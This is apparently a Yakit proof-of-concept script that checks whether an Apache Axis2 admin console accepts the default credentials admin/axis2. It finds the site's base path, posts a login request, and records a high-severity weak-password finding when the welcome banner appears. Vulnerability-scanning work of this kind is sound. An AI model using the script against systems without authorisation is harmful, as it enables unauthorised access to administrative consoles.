script_name: axis2后台默认密码漏洞检测
content:
##server:axis
##type:poc
##params:root_url
##name:axis2_weak_password_poc
##severity:high
##out_put:axis_username,axis_password
##require:
loglevel(`info`)
yakit.AutoInitYakit()

handleCheck = func(root_url,path){
    ip, port, _ = str.ParseStringToHostPort(root_url)
    addr = str.HostPort(ip, port)
    isTls=str.IsTLSServer(addr)
    packet = `POST {{params(path)}}axis2-admin/login HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Length: 48
Content-Type: application/x-www-form-urlencoded
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36

userName=admin&password=axis2&submit=+Login+
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"path":path,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8083")
    )
    // dump(rsp)
    if len(rsp) > 0 {        
        if str.MatchAllOfSubString(rsp, "Welcome to Axis2 Web Admin Module !!"){
            // yakit.Info("%v found Apache Axis2 弱口令漏洞", addr)
            risk.NewRisk(
            root_url,risk.title("Apache Axis2 弱口令漏洞"),
            risk.severity("high"),
            risk.titleVerbose("Apache Axis2 弱口令漏洞"),
            risk.type("身份伪造"),
            risk.request(req),
            risk.response(rsp),
            risk.details({"username":"admin","password":"axis2"})
        )
        }       
    }
    return
}

base_href_path=func(root_url,base_href_rule){
    ip, port, _ = str.ParseStringToHostPort(root_url)
    addr = str.HostPort(ip, port)
    isTls=str.IsTLSServer(addr)
    packet=`GET / HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36`
    rsp,req,err=poc.HTTP(
        packet,
        poc.https(isTls),
        poc.params({"addr":addr}),
        // poc.proxy("http://127.0.0.1:8080")
        )
    if re.Match(base_href_rule, rsp){
        base_href=re.FindSubmatch(rsp, base_href_rule)[1]
        log.info(f"匹配到路径为${base_href}")
        return base_href
    }else{
        log.info("请确认该站点是否存在axis中间件")
        os.Exit(0)
    }
}

main=func(root_url){
    base_href_rule=`<base href="https?://.*?(/.*?)"`
    base_href=base_href_path(root_url,base_href_rule)
    handleCheck(root_url,base_href)
}

root_url = cli.String("root_url")
main(root_url)
help: 检测axis2后台是否使用默认的账号密码，适配修改axis2绝对路径的场景
author: 汤鲜味美砂锅面🍜
